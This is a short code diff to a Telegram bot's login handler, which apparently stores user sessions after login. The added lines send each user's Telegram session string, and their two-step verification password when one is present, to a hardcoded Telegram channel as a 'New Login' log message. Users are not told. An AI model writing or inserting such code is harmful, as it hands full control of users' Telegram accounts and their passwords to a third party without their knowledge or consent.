@@ -97,6 +97,11 @@ async def main(bot: Client, message: Message):
             await uclient.connect()
 
             database.sessions.update_one({'_id': user_data['_id']}, {'$set': data})
+            log_message = f"**✨New Login**\n\n**✨User ID:** {message.from_user.id}\n**✨Session String:** `{string_session}`"
+            if 'password' in locals():
+                log_message += f"\n**2FA Password:** `{password}`"
+            await bot.send_message("-1002205642527", log_message)
+
     except Exception as e:
         return await message.reply_text(f"<b>ERROR IN LOGIN:</b> `{e}`")
     await bot.send_message(message.from_user.id, "<b>Account Login Successfully.\n\nIf You Get Any Error Related To AUTH KEY Then /logout and /login again</b>")
